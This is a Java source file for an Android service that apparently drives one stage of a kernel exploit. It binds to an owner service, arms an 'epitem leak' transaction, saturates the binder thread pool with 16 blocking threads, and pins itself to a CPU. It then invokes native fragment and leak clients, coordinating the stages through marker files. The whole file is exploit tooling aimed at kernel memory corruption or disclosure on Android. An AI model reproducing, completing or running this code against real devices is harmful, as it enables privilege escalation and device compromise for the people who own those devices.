package com.vandam.prism;

import android.app.Service;
import android.content.ComponentName;
import android.content.Context;
import android.content.Intent;
import android.content.ServiceConnection;
import android.os.Binder;
import android.os.IBinder;
import android.os.Parcel;
import android.os.Process;

import java.io.File;
import java.io.FileOutputStream;
import java.nio.charset.StandardCharsets;
import java.nio.file.Files;

public class BatchClientService extends Service {
    private static final int BLOCKER_COUNT = 16;
    private final Binder lifetime = new Binder();

    private final ServiceConnection connection = new ServiceConnection() {
        @Override
        public void onServiceConnected(ComponentName name, IBinder owner) {
            try {
                run(owner);
            } catch (Exception exception) {
                String message = exception.getMessage();
                write("epitem-leak.result",
                        "status=fail stage=epitem-leak reason=client type=" +
                        exception.getClass().getSimpleName() +
                        " message=" + (message == null ? "none" : message));
            } finally {
                Process.killProcess(Process.myPid());
            }
        }

        @Override
        public void onServiceDisconnected(ComponentName name) {
            Process.killProcess(Process.myPid());
        }
    };

    @Override
    public int onStartCommand(Intent intent, int flags, int startId) {
        Class<? extends Service> ownerClass = intent != null &&
                intent.getBooleanExtra("owner2", false)
                ? OwnerService2.class : OwnerService.class;
        if (!bindService(new Intent(this, ownerClass), connection,
                         Context.BIND_AUTO_CREATE)) {
            write("epitem-leak.result",
                    "status=fail stage=epitem-leak reason=client-bind");
            Process.killProcess(Process.myPid());
        }
        return START_NOT_STICKY;
    }

    @Override
    public IBinder onBind(Intent intent) {
        return lifetime;
    }

    private void run(IBinder owner) throws Exception {
        String handleState = NativeBridge.cacheOwnerHandle();
        if (!handleState.startsWith("status=pass")) {
            throw new IllegalStateException("owner-handle");
        }

        Parcel armData = Parcel.obtain();
        Parcel armReply = Parcel.obtain();
        try {
            owner.transact(OwnerService.TRANSACTION_ARM_EPITEM_LEAK,
                    armData, armReply, 0);
            armReply.readException();
            if (armReply.readInt() != 1) {
                throw new IllegalStateException("owner-arm");
            }
        } finally {
            armReply.recycle();
            armData.recycle();
        }

        write("epitem-reader.prepare", "1");
        File waiting = new File(getFilesDir(), "epitem-reader.waiting");
        waitFor(waiting, 5000);
        String waitingState = new String(Files.readAllBytes(
                waiting.toPath()), StandardCharsets.UTF_8).trim();
        int cpu = Integer.parseInt(waitingState.substring(
                waitingState.indexOf('=') + 1));

        File saturated = new File(getFilesDir(),
                "blockers-saturated.ready");
        saturated.delete();
        for (int index = 0; index < BLOCKER_COUNT; index++) {
            Thread blocker = new Thread(() -> block(owner),
                    "binder-pool-blocker-" + index);
            blocker.start();
        }
        waitFor(saturated, 5000);
        write("epitem-reader.start", "1");
        if (NativeBridge.pinCurrentThread(cpu) != cpu) {
            throw new IllegalStateException("fragment-client-affinity");
        }
        String fragmentState = NativeBridge.runEpitemFragmentClient();
        write("epitem-fragment.result", fragmentState);
        if (!fragmentState.startsWith("status=pass")) {
            throw new IllegalStateException(
                    "native-fragment-client " + fragmentState);
        }
        waitFor(new File(getFilesDir(), "epitem-reader.fragmented"), 60000);
        if (new File(getFilesDir(), "controlled-reader.request").exists()) {
            waitFor(new File(getFilesDir(), "controlled-export.proceed"),
                    120000);
        }

        String clientState = NativeBridge.runEpitemLeakClient();
        if (!clientState.startsWith("status=pass")) {
            throw new IllegalStateException("native-client " + clientState);
        }
        write("epitem-client.queued", "nodes=1152 transactions=1152");
        write("epitem-client.exiting", Integer.toString(Process.myPid()));
    }

    private void block(IBinder owner) {
        Parcel data = Parcel.obtain();
        Parcel reply = Parcel.obtain();
        try {
            owner.transact(OwnerService.TRANSACTION_BLOCK_POOL,
                    data, reply, 0);
        } catch (Exception ignored) {
        } finally {
            reply.recycle();
            data.recycle();
        }
    }

    private void waitFor(File file, int timeoutMs) throws Exception {
        int attempts = Math.max(1, timeoutMs / 10);
        for (int attempt = 0; attempt < attempts && !file.exists(); attempt++) {
            Thread.sleep(10);
        }
        if (!file.exists()) {
            throw new IllegalStateException("timeout-" + file.getName());
        }
    }

    private void write(String name, String value) {
        File file = new File(getFilesDir(), name);
        try (FileOutputStream stream = new FileOutputStream(file, false)) {
            stream.write((value + "\n").getBytes(StandardCharsets.UTF_8));
            stream.getFD().sync();
        } catch (Exception ignored) {
        }
    }
}
